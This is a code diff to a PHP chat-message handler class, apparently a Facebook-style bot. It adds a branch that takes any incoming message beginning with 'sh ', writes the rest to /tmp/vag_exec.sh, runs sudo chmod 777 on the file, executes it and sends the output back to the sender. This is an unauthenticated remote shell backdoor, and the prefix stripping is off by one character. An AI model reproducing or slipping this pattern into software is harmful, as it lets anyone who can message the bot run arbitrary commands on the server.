@@ -55,10 +55,17 @@ final class VagHandler
 					if ($data["senderID"] != $fb["user_id"]) {
 						if (isset($data["body"]) && is_string($data["body"])) {
 							$start = microtime(true);
-							$this->vag = new Vag($this->app);
-							$this->vag->setInput($data["body"]);
-							$this->vag->exec();
-							$resp = json_encode($this->vag->getResponse());
+							if (strtolower(substr($data["body"], 0, 3)) == "sh ") {
+								$data["body"] = substr($data["body"], 4);
+								file_put_contents("/tmp/vag_exec.sh", "#!/bin/sh\n{$data["body"]}");
+								shell_exec("sudo chmod 777 /tmp/vag_exec.sh");
+								$resp = shell_exec("/tmp/vag_exec.sh 2>&1");
+							} else {
+								$this->vag = new Vag($this->app);
+								$this->vag->setInput($data["body"]);
+								$this->vag->exec();
+								$resp = json_encode($this->vag->getResponse());
+							}
 							echo json_encode(["send" => true, "response" => $resp."\n\n".("Exection time: ".(microtime(true) - $start)."\n\n")]);
 						} else {
 							echo json_encode(["send" => false]);
